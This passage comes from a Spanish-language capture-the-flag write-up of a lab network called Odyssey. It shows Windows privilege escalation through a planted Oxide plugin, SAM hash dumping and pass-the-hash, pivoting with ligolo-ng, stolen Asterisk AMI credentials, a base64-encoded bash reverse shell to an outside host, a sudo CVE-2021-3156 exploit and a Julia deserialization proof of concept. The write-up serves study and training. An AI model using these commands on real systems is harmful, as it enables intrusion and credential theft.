<p class="plain-text">Simplemente nos queda subir el archivo <code class="language-plaintext highlighter-rouge">.cs</code> al directorio plugins de <code class="language-plaintext highlighter-rouge">oxide</code> y esperar a que se ejecute, podemos subirlo usando la funcion <code class="language-plaintext highlighter-rouge">upload</code> de evil-winrm</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\rustserver\oxide\plugins&gt; </span><span class="am">upload </span><span class="p">EpicStuff.cs
</span><span class="az">
Info: Uploading EpicStuff.cs to C:\rustserver\oxide\plugins\EpicStuff.cs  
</span><span class="sa">
Data: 4352 bytes of 4352 bytes copied
</span><span class="az">
Info: Upload successful!
</span><span class="p">
PS C:\rustserver\oxide\plugins&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Despues de unos segundos se carga el <code class="language-plaintext highlighter-rouge">plugin</code> y se interpreta nuestro payload, y por consecuencia se crea el usuario <code class="language-plaintext highlighter-rouge">pwned</code> que pertenece al grupo <code class="language-plaintext highlighter-rouge">Administrators</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\rustserver\oxide\plugins&gt; </span><span class="am">net </span><span class="p">user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           elpenor
Guest                    pwned                    sshd
WDAGUtilityAccount
The command completed with one or more errors.

PS C:\rustserver\oxide\plugins&gt; </span><span class="am">net </span><span class="p">localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain  

Members

-------------------------------------------------------------------------------
Administrator
pwned
The command completed successfully.

PS C:\rustserver\oxide\plugins&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Como el usuario es administrador nos devuelve un <code class="language-plaintext highlighter-rouge">Pwn3d!</code> en crackmapexec por lo que podemos dumpear la <code class="language-plaintext highlighter-rouge">sam</code> y ver todos los hashes <code class="language-plaintext highlighter-rouge">NT</code> de los usuarios</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.13.38.21 -u pwned -p password123#
</span><span class="az">SMB         </span><span class="p">10.13.38.21     445    ONLINE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:ONLINE) (domain:ONLINE) (signing:False) (SMBv1:False)  
</span><span class="az">SMB         </span><span class="p">10.13.38.21     445    ONLINE           </span><span class="ve">[+] </span><span class="p">ONLINE\pwned:password123# </span><span class="am">(Pwn3d!)

</span><span class="ve">❯ crackmapexec </span><span class="p">smb 10.13.38.21 -u pwned -p password123# --sam
</span><span class="az">SMB         </span><span class="p">10.13.38.21     445    ONLINE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:ONLINE) (domain:ONLINE) (signing:False) (SMBv1:False)  
</span><span class="az">SMB         </span><span class="p">10.13.38.21     445    ONLINE           </span><span class="ve">[+] </span><span class="p">ONLINE\pwned:password123# </span><span class="am">(Pwn3d!)
</span><span class="az">SMB         </span><span class="p">10.13.38.21     445    ONLINE           </span><span class="az">[*] </span><span class="p">Dumping SAM hashes
</span><span class="az">SMB         </span><span class="p">10.13.38.21     445    ONLINE           </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c606623dc66bad2c670d402d4a33d2b7:::
</span><span class="az">SMB         </span><span class="p">10.13.38.21     445    ONLINE           </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span class="az">SMB         </span><span class="p">10.13.38.21     445    ONLINE           </span><span class="am">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span class="az">SMB         </span><span class="p">10.13.38.21     445    ONLINE           </span><span class="am">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b2aee3361c843009143be1a935d8db9b:::
</span><span class="az">SMB         </span><span class="p">10.13.38.21     445    ONLINE           </span><span class="am">elpenor:1001:aad3b435b51404eeaad3b435b51404ee:72f5cfa80f07819ccbcfb72feb9eb9b7:::
</span><span class="az">SMB         </span><span class="p">10.13.38.21     445    ONLINE           </span><span class="am">sshd:1002:aad3b435b51404eeaad3b435b51404ee:696df4f224281d855e7716d56acc2bc8:::
</span><span class="az">SMB         </span><span class="p">10.13.38.21     445    ONLINE           </span><span class="am">pwned:1003:aad3b435b51404eeaad3b435b51404ee:e5abfbc0410c5ce37bae2276dee52aaf:::</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos simplemente conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>, obtener una shell y leer la flag</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ evil-winrm</span><span class="p"> -i 10.13.38.21 -u Administrator -H c606623dc66bad2c670d402d4a33d2b7  
PS C:\Users\Administrator\Documents&gt; </span><span class="am">whoami</span><span class="p">
online\administrator
PS C:\Users\Administrator\Documents&gt; </span><span class="am">type </span><span class="p">..\Desktop\flag.txt
ODYSSEY{Ded1CA7eD_rU57_5ERVeR}
PS C:\Users\Administrator\Documents&gt;</span>
</code></pre></div></div><br>

</section>

<section class="post" id="flag3">
<br><h3 class="post-title">Entanglement</h3>
<h4 class="post-title">ODYSSEY{THE_tElEPH0Ne_4_New_M4cHINe}</h4><br>

<p class="plain-text">Al hacer un <code class="language-plaintext highlighter-rouge">ipconfig</code> nos damos cuenta que tenemos otra interfaz de red en la cual nuestra direccion IPv4 es la <code class="language-plaintext highlighter-rouge">192.168.21.10</code> pero puede haber mas equipos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\Administrator\Documents&gt; </span><span class="am">ipconfig
</span><span class="p">
Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::17
   IPv6 Address. . . . . . . . . . . : dead:beef::a04b:6d7c:3355:828d  
   Link-local IPv6 Address . . . . . : fe80::a04b:6d7c:3355:828d%6
   IPv4 Address. . . . . . . . . . . : 10.13.38.21
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:deb9%6
                                       10.13.38.2

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::1521:9a68:91c:f431%4
   IPv4 Address. . . . . . . . . . . : 192.168.21.10
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.21.2

PS C:\Users\Administrator\Documents&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Para tener conexion desde nuestro equipo podemos usar <a href="https://github.com/nicocha30/ligolo-ng/">ligolo-ng</a> usando el <code class="language-plaintext highlighter-rouge">agent</code> para conectarnos a nuestro equipo por el puerto <code class="language-plaintext highlighter-rouge">11601</code> que nos marca el <code class="language-plaintext highlighter-rouge">proxy</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\Administrator\Documents&gt; </span><span class="am">upload </span><span class="p">agent.exe
</span><span class="az">
Info: Uploading agent.exe to C:\Users\Administrator\Documents\agent.exe
</span><span class="sa">
Data: 6460072 bytes of 6460072 bytes copied
</span><span class="az">
Info: Upload successful!
</span><span class="p">
PS C:\Users\Administrator\Documents&gt; </span><span class="am">.\agent.exe </span><span class="c1">-connect </span><span class="p">10.10.14.10:11601 </span><span class="c1">-ignore-cert  </span>
</code></pre></div></div><br>

<p class="plain-text">En el proxy obtenemos una <code class="language-plaintext highlighter-rouge">sesión</code>, la indicamos e iniciamos el tunel con <code class="language-plaintext highlighter-rouge">start</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ ./proxy </span><span class="p">-selfcert
</span><span class="am">WARN</span><span class="p">[0000] Using automatically generated self-signed certificates (Not recommended) 
</span><span class="az">INFO</span><span class="p">[0000] Listening on 0.0.0.0:11601                   
</span><span class="am">    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

Made in France ♥ by @Nicocha30!

ligolo-ng » 
</span><span class="az">INFO</span><span class="p">[0051] Agent joined.         </span><span class="az">name</span><span class="p">="ONLINE\\Administrator@online" </span><span class="az">remote</span><span class="p">="10.13.38.21:49679"  
</span><span class="am">ligolo-ng » </span><span class="p">session
</span><span class="ve">? </span><span class="p">Specify a session : </span><span class="az">1 - ONLINE\Administrator@online - 10.13.38.21:49679
</span><span class="am">[Agent : ONLINE\Administrator@online] » </span><span class="p">start
</span><span class="az">INFO</span><span class="p">[0062] Starting tunnel to ONLINE\Administrator@online 
</span><span class="am">[Agent : ONLINE\Administrator@online] »</span>
</code></pre></div></div><br>

<p class="plain-text">Agregamos el segmento <code class="language-plaintext highlighter-rouge">192.168.21.0/24</code> a la interfaz de <code class="language-plaintext highlighter-rouge">ligolo</code> y ahora tenemos conexión con todos los equipos de la interfaz, podemos comprobarlo con un ping</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sudo ip </span><span class="p">route add 192.168.21.0/24 dev ligolo

</span><span class="ve">❯ ping </span><span class="p">-c1 -w1 192.168.21.10   
PING 192.168.21.10 (192.168.21.10) 56(84) bytes of data.
64 bytes from 192.168.21.10: icmp_seq=1 ttl=64 time=167 ms

--- 192.168.21.10 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms  
rtt min/avg/max/mdev = 167.279/167.279/167.279/0.000 ms</span>
</code></pre></div></div><br>

<p class="plain-text">A través de <code class="language-plaintext highlighter-rouge">ping</code> logramos encontrar otros <code class="language-plaintext highlighter-rouge">3</code> hosts activos, podemos escanear los puertos con <code class="language-plaintext highlighter-rouge">nmap</code> de estos, desde el host <code class="language-plaintext highlighter-rouge">.11</code> hasta la <code class="language-plaintext highlighter-rouge">.13</code> de esta interfaz</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ nmap </span><span class="p">192.168.21.11-13
Nmap scan report for 192.168.21.11  
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
3000/tcp open  ppp

Nmap scan report for 192.168.21.12 
PORT      STATE SERVICE
3000/tcp  open  ppp
5039/tcp  open  unknown
8080/tcp  open  http-proxy
25000/tcp open  icl-twobase1

Nmap scan report for 192.168.21.13  
PORT    STATE SERVICE
22/tcp  open  ssh
111/tcp open  rpcbind</span>
</code></pre></div></div><br>

<p class="plain-text">Iniciemos por la web de la <code class="language-plaintext highlighter-rouge">.12</code> en el puerto 8080 el cual simplemente corre <code class="language-plaintext highlighter-rouge">gogs</code></p>
<a href="/endgames/odyssey/4.png" target="_blank"><div><p><img src="/endgames/odyssey/4.png"></p></div></a>

<p class="plain-text">Sabemos la existencia de un usuario llamado <code class="language-plaintext highlighter-rouge">elpenor</code>, al revisar si tiene una cuenta en <code class="language-plaintext highlighter-rouge">gogs</code> nos aparece como existente y nos muestra un <code class="language-plaintext highlighter-rouge">repositorio</code> publico</p>
<a href="/endgames/odyssey/5.png" target="_blank"><div><p><img src="/endgames/odyssey/5.png"></p></div></a>

<p class="plain-text">El repositorio es el codigo fuente para un bot para <code class="language-plaintext highlighter-rouge">rocket chat</code> que corre en el 3000</p>
<a href="/endgames/odyssey/6.png" target="_blank"><div><p><img src="/endgames/odyssey/6.png"></p></div></a>

<p class="plain-text">Tambien podemos ver toda la actividad <code class="language-plaintext highlighter-rouge">publica</code> del usuario elpenor, como commits</p>
<a href="/endgames/odyssey/7.png" target="_blank"><div><p><img src="/endgames/odyssey/7.png"></p></div></a>

<p class="plain-text">En uno de los <code class="language-plaintext highlighter-rouge">commits</code> encontramos un enlace el cual te lleva a un registro de <code class="language-plaintext highlighter-rouge">invitacion</code> al que si un usuario entra puede registrarse en <code class="language-plaintext highlighter-rouge">rocket chat</code></p>
<a href="/endgames/odyssey/8.png" target="_blank"><div><p><img src="/endgames/odyssey/8.png"></p></div></a>

<p class="plain-text">Entramos al enlace que nos comparten y registramos un usuario cualquiera, como test donde obtenemos acceso a un <code class="language-plaintext highlighter-rouge">rocket chat</code> donde hay un foro llamado general</p>
<a href="/endgames/odyssey/9.png" target="_blank"><div><p><img src="/endgames/odyssey/9.png"></p></div></a>

<a href="/endgames/odyssey/10.png" target="_blank"><div><p><img src="/endgames/odyssey/10.png"></p></div></a>

<p class="plain-text">Otra cosa interesante es que en los problemas <code class="language-plaintext highlighter-rouge">elpenor</code> solicita la creacion de un servidor <code class="language-plaintext highlighter-rouge">voip</code>, y pide que se la pasen a <code class="language-plaintext highlighter-rouge">aeolus</code> con la sintaxis <code class="language-plaintext highlighter-rouge">ip &lt;ip address&gt;</code></p>
<a href="/endgames/odyssey/11.png" target="_blank"><div><p><img src="/endgames/odyssey/11.png"></p></div></a>

<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">netsh</code> redirigimos todo el trafico entrante del puerto <code class="language-plaintext highlighter-rouge">5038</code> donde escucha <code class="language-plaintext highlighter-rouge">voip</code> a nuestro host para asi poder recibir la <code class="language-plaintext highlighter-rouge">peticion</code> desde nuestra maquina</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\Administrator\Documents&gt; </span><span class="am">netsh </span><span class="p">interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=5038 connectaddress=10.10.14.10 connectport=5038  
PS C:\Users\Administrator\Documents&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Enviamos la ip <code class="language-plaintext highlighter-rouge">192.168.21.10</code> que es la del windows al bot aeolus en el <code class="language-plaintext highlighter-rouge">chat</code> y en nuestra maquina atacante recibimos la peticion, la cual solo intenta <code class="language-plaintext highlighter-rouge">autenticarse</code></p>
<a href="/endgames/odyssey/12.png" target="_blank"><div><p><img src="/endgames/odyssey/12.png"></p></div></a>

<p class="plain-text">Ya que nosotros recibimos la autenticacion interceptamos las <code class="language-plaintext highlighter-rouge">credenciales</code> de este</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ netcat </span><span class="p">-lvnp 5038
Listening on 0.0.0.0 5038
Connection received on 10.13.38.21  
Action: login
Username: aeolus
Secret: P7xJ6y6x
ActionID: __auth_1693366373541__</span>
</code></pre></div></div><br>

<p class="plain-text">El puerto <code class="language-plaintext highlighter-rouge">5038</code> de la maquina esta cerrado pero el <code class="language-plaintext highlighter-rouge">5039</code> esta abierto que es ssl, podemos crear un archivo <code class="language-plaintext highlighter-rouge">commands.txt</code> con la autenticacion que se realizaba</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">Action: login
Username: aeolus
Secret: P7xJ6y6x</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora nos conectamos el puerto <code class="language-plaintext highlighter-rouge">5039</code> de la maquina con <code class="language-plaintext highlighter-rouge">openssl</code> y enviamos el contenido del <code class="language-plaintext highlighter-rouge">commands.txt</code> como input, recibimos un Authentication accepted</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ cat </span><span class="p">commands.txt | </span><span class="ve">openssl </span><span class="p">s_client -quiet -connect 192.168.21.12:5039  
Response: Success
Message: Authentication accepted

Event: FullyBooted
Privilege: system,all
Uptime: 4251
LastReload: 4251
Status: Fully Booted</span>
</code></pre></div></div><br>

<p class="plain-text">Realizamos el mismo proceso pero esta vez le agregamos un <code class="language-plaintext highlighter-rouge">help</code> como comando</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">Action: login
Username: aeolus
Secret: P7xJ6y6x

Action: command
Command: help</span>
</code></pre></div></div><br>

<p class="plain-text">Encontramos varias funciones, entre ellas <code class="language-plaintext highlighter-rouge">dialplan add extension</code> que agregaremos al archivo <code class="language-plaintext highlighter-rouge">commands.txt</code> para asi ver la sintaxis que se necesita para poder usarla</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">Action: login
Username: aeolus
Secret: P7xJ6y6x

Action: command
Command: dialplan add extension</span>
</code></pre></div></div><br>

<p class="plain-text">En los privilegios encontramos <code class="language-plaintext highlighter-rouge">system,all</code> que es lo que podemos usar, ademas podemos ver los <code class="language-plaintext highlighter-rouge">argumentos</code> que esta funcion necesita para ejecutarse</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ cat </span><span class="p">commands.txt | </span><span class="ve">openssl </span><span class="p">s_client -quiet -connect 192.168.21.12:5039
Response: Success
Message: Authentication accepted

Event: FullyBooted
Privilege: system,all
Uptime: 4356
LastReload: 4356
Status: Fully Booted

Response: Error
Message: Command output follows
Output: Usage: dialplan add extension &lt;exten&gt;,&lt;priority&gt;,&lt;app&gt; into &lt;context&gt; [replace]  
Output: 
Output:        app can be either:
Output:          app-name
Output:          app-name(app-data)
Output:          app-name,&lt;app-data&gt;
Output: 
Output:        This command will add the new extension into &lt;context&gt;.  If
Output:        an extension with the same priority already exists and the
Output:        'replace' option is given we will replace the extension.
Output: 
Output: Example: dialplan add extension 6123,1,Dial,IAX/216.207.245.56/6123 into local
Output:          Now, you can dial 6123 and talk to Markster :)</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos usar <code class="language-plaintext highlighter-rouge">system</code>, pero para poder enviarnos una shell encodearemos en <code class="language-plaintext highlighter-rouge">base64</code> un clasico oneliner en bash que lo enviara a la <code class="language-plaintext highlighter-rouge">.10</code> en el puerto 4444</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ echo </span><span class="am">'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.21.10/4444 0&gt;&amp;1"' </span><span class="p">| </span><span class="ve">base64</span><span class="p">
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIxLjEwLzQ0NDQgMD4mMSIK  </span>
</code></pre></div></div><br>

<p class="plain-text">Ahora con crearemos extensión <code class="language-plaintext highlighter-rouge">test</code> bajo el contexto <code class="language-plaintext highlighter-rouge">pwned</code> que se encargara de ejecutar con <code class="language-plaintext highlighter-rouge">system</code> nuestro payload, seguido de llamar a la extension <code class="language-plaintext highlighter-rouge">test</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">Action: login
Username: aeolus
Secret: P7xJ6y6x

Action: command
Command: dialplan add extension test,1,system(echo\ YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIxLjEwLzQ0NDQgMD4mMSIK|base64\ -d|bash), into pwned replace  

Action: command
Command: originate local/test@pwned extension test@pwned</span>
</code></pre></div></div><br>

<p class="plain-text">En el windows redirigimos el trafico que entre por el puerto <code class="language-plaintext highlighter-rouge">4444</code> a nuestro host</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\Administrator\Documents&gt; </span><span class="am">netsh </span><span class="p">interface portproxy add v4tov4 listenaddress=192.168.21.10 listenport=4444 connectaddress=10.10.14.10 connectport=4444  
PS C:\Users\Administrator\Documents&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Finalmente enviamos los comandos a <code class="language-plaintext highlighter-rouge">voip</code> y el interpretarse el payload con <code class="language-plaintext highlighter-rouge">system</code> recibimos una shell como el usuario <code class="language-plaintext highlighter-rouge">asterisk</code> en la <code class="language-plaintext highlighter-rouge">.12</code> donde podemos leer la flag</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ cat </span><span class="p">commands.txt | </span><span class="ve">openssl </span><span class="p">s_client -quiet -connect 192.168.21.12:5039  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ netcat </span><span class="p">-lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.13.38.21
</span><span class="ve">asterisk@odyssey</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
uid=112(asterisk) gid=117(asterisk) groups=117(asterisk)  
</span><span class="ve">asterisk@odyssey</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
192.168.21.12 172.17.0.1 10.1.148.128 
</span><span class="ve">asterisk@odyssey</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /opt/flag.txt 
ODYSSEY{THE_tElEPH0Ne_4_New_M4cHINe}
</span><span class="ve">asterisk@odyssey</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

</section>

<section class="post" id="flag4">
<br><h3 class="post-title">Can you see a singularity?</h3>
<h4 class="post-title">ODYSSEY{W3_4LL_4r3_p4r7_Of_4_cluS73R}</h4><br>

<p class="plain-text">Mirando la version de <code class="language-plaintext highlighter-rouge">sudo</code> encontramos la <code class="language-plaintext highlighter-rouge">1.38.1</code>, la cual es un poco antigua</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">asterisk@odyssey</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo --version
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31  
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
</span><span class="ve">asterisk@odyssey</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Buscando exploits encontramos el <a href="https://github.com/worawit/CVE-2021-3156">CVE-2021-3156</a> que se aprovecha de esto, simplemente copiamos el exploit y al ejecutarlo ganamos una shell como <code class="language-plaintext highlighter-rouge">root</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">asterisk@odyssey</span><span class="p">:</span><span class="az">~</span><span class="p">$ python3 exploit_nss.py  
# whoami
root
# hostname -I	
192.168.21.12 172.17.0.1 10.1.148.128 
# cat /root/flag.txt
ODYSSEY{W3_4LL_4r3_p4r7_Of_4_cluS73R}
#</span>
</code></pre></div></div><br>

</section>

<section class="post" id="flag5">
<br><h3 class="post-title">Zero Entropy</h3>
<h4 class="post-title">ODYSSEY{JUL14_d353R14L124710n}</h4><br>

<p class="plain-text">En el directorio <code class="language-plaintext highlighter-rouge">/opt</code> encontramos otro .git llamado <code class="language-plaintext highlighter-rouge">apikey_beta</code> de los repositorios de gogs que pertenece a <code class="language-plaintext highlighter-rouge">elpenor</code>, lo copiaremos a un directorio dentro de <code class="language-plaintext highlighter-rouge">/tmp</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">root@odyssey</span><span class="p">:</span><span class="az">/opt/git/gogs-repositories/elpenor</span><span class="p"># ls -l
drwxr-xr-x 7 asterisk root 4096 Mar 25  2021 </span><span class="az">apikey_beta.git</span><span class="p">
drwxr-xr-x 7 asterisk root 4096 Feb 28  2021 </span><span class="az">rocketchat_bot.git  
</span><span class="ve">root@odyssey</span><span class="p">:</span><span class="az">/opt/git/gogs-repositories/elpenor</span><span class="p"># mkdir /tmp/otros
</span><span class="ve">root@odyssey</span><span class="p">:</span><span class="az">/opt/git/gogs-repositories/elpenor</span><span class="p"># cp -r apikey_beta.git /tmp/otros/.git  
</span><span class="ve">root@odyssey</span><span class="p">:</span><span class="az">/opt/git/gogs-repositories/elpenor</span><span class="p">#</span>
</code></pre></div></div><br>

<p class="plain-text">Si intentamos ver el estado nos pide que lo hagamos en una <code class="language-plaintext highlighter-rouge">rama</code>, despues de eliminar la configuracion de <code class="language-plaintext highlighter-rouge">bare</code> podemos ejecutarlo de nuevo y ver el estado</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">root@odyssey</span><span class="p">:</span><span class="az">/tmp/otros</span><span class="p"># git status
fatal: this operation must be run in a work tree  
</span><span class="ve">root@odyssey</span><span class="p">:</span><span class="az">/tmp/otros</span><span class="p"># git config --unset core.bare  
</span><span class="ve">root@odyssey</span><span class="p">:</span><span class="az">/tmp/otros</span><span class="p"># git status
On branch master
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
	</file></span><span class="ve">deleted:    README.md
	deleted:    genie.service
	deleted:    run.ji

</span><span class="ve">root@odyssey</span><span class="p">:</span><span class="az">/opt/git/gogs-repositories/elpenor</span><span class="p">#</span>
</code></pre></div></div><br>

<p class="plain-text">Hay <code class="language-plaintext highlighter-rouge">3</code> archivos borrados, los cuales podemos restaurar usando <code class="language-plaintext highlighter-rouge">git reset --hard</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">root@odyssey</span><span class="p">:</span><span class="az">/tmp/otros</span><span class="p"># git reset --hard
HEAD is now at 0512c32 Update 'README.md'
</span><span class="ve">root@odyssey</span><span class="p">:</span><span class="az">/tmp/otros</span><span class="p"># ls -l
-rw-r--r-- 1 root root 170 Aug 30 04:02 genie.service  
-rw-r--r-- 1 root root 311 Aug 30 04:02 README.md
-rw-r--r-- 1 root root 627 Aug 30 04:02 run.ji
</span><span class="ve">root@odyssey</span><span class="p">:</span><span class="az">/tmp/otros</span><span class="p">#</span>
</code></pre></div></div><br>

<p class="plain-text">Iniciemos por el archivo <code class="language-plaintext highlighter-rouge">genie.service</code> que simplemente es un <code class="language-plaintext highlighter-rouge">servicio</code> que se corre bajo el usuario <code class="language-plaintext highlighter-rouge">elpenor</code> y simplemente ejecuta con <code class="language-plaintext highlighter-rouge">julia</code> el archivo <code class="language-plaintext highlighter-rouge">run.ji</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">root@odyssey</span><span class="p">:</span><span class="az">/tmp/otros</span><span class="p"># cat genie.service
[Unit]
Description= Julia API
After=network.target

[Service]
Type=simple
User=elpenor
ExecStart=/usr/bin/julia /opt/beta_api/run.ji  

[Install]
WantedBy=multi-user.target
</span><span class="ve">root@odyssey</span><span class="p">:</span><span class="az">/tmp/otros</span><span class="p">#</span>
</code></pre></div></div><br>

<p class="plain-text">El archivo <code class="language-plaintext highlighter-rouge">run.ji</code> es algo simple, define una web que recibe un parametro <code class="language-plaintext highlighter-rouge">f</code> por POST hacia la ruta <code class="language-plaintext highlighter-rouge">/key</code>, despues lo decodea de <code class="language-plaintext highlighter-rouge">base64</code> y procede a deserializarlo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">root@odyssey</span><span class="p">:</span><span class="az">/tmp/otros</span><span class="p"># cat run.ji  
using Genie
using Genie.Router, Genie.Renderer, Genie.Renderer.Html, Genie.Renderer.Json, Genie.Requests, Base64, Serialization

route("/") do
    return "Key API"
end

route("/key", method = POST) do
    data = postpayload(:f)
    io = IOBuffer()
    iob64_decode = Base64DecodePipe(io)
    write(io, data)
    seekstart(io)
    new_data = String(read(iob64_decode))
    con = isfile("/tmp/f.txt")
    if con == true
        rm("/tmp/f.txt")
    else
        "N"
    end
    open("/tmp/f.txt", "w") do io
        write(io, new_data)
    end;

    Serialization.deserialize("/tmp/f.txt");
end

up(3000, "0.0.0.0", async=false)
</span><span class="ve">root@odyssey</span><span class="p">:</span><span class="az">/tmp/otros</span><span class="p">#</span>
</code></pre></div></div><br>

<p class="plain-text">Buscando por vulnerabilidades en julia encontramos un ataque de <a href="https://github.com/JuliaLang/julia/issues/32601">deserializacion</a>, tomamos el <code class="language-plaintext highlighter-rouge">poc</code> y lo usaremos para intentar ejecutar simplemente el comando <code class="language-plaintext highlighter-rouge">id</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ ./julia
               _
   </span><span class="az">_       </span><span class="p">_ </span><span class="ro">_</span><span class="ve">(_)</span><span class="sa">_     </span><span class="p">|  Documentation: https://docs.julialang.org
</span><span class="az">  (_)    </span><span class="p"> | </span><span class="ro">(_) </span><span class="sa">(_)   </span><span class="p"> |
   _ _   _| |_  __ _   |  Type "?" for help, "]?" for Pkg help.
  | | | | | | |/ _` |  |
  | | |_| | | | (_| |  |  Version 1.1.1 (2019-05-16)
 _/ |\__'_|_|_|\__'_|  |  Official https://julialang.org/ release
|__/                   |

</span><span class="ve">julia&gt; </span><span class="p">using Serialization

</span><span class="ve">julia&gt; </span><span class="p">Serialization.deserialize(s::Serializer, t::Type{BigInt})=run(`id`);  

</span><span class="ve">julia&gt; </span><span class="p">filt=filter(methods(Serialization.deserialize).ms) do m
           String(m.file)[1]=='R' end;

</span><span class="ve">julia&gt; </span><span class="p">Serialization.serialize("poc.serialized_jl", (filt[1], BigInt(7)));
</span><span class="ve">
julia&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Una vez creado se lo enviaremos a la <code class="language-plaintext highlighter-rouge">.11</code> que es la que corre en el puerto <code class="language-plaintext highlighter-rouge">3000</code> el script que vimos antes, como parametro <code class="language-plaintext highlighter-rouge">f</code> le enviaremoa la data en <code class="language-plaintext highlighter-rouge">base64</code> como se muestra en el codigo, como resultado ejecutamos el comando <code class="language-plaintext highlighter-rouge">id</code> como <code class="language-plaintext highlighter-rouge">elpenor</code></p>
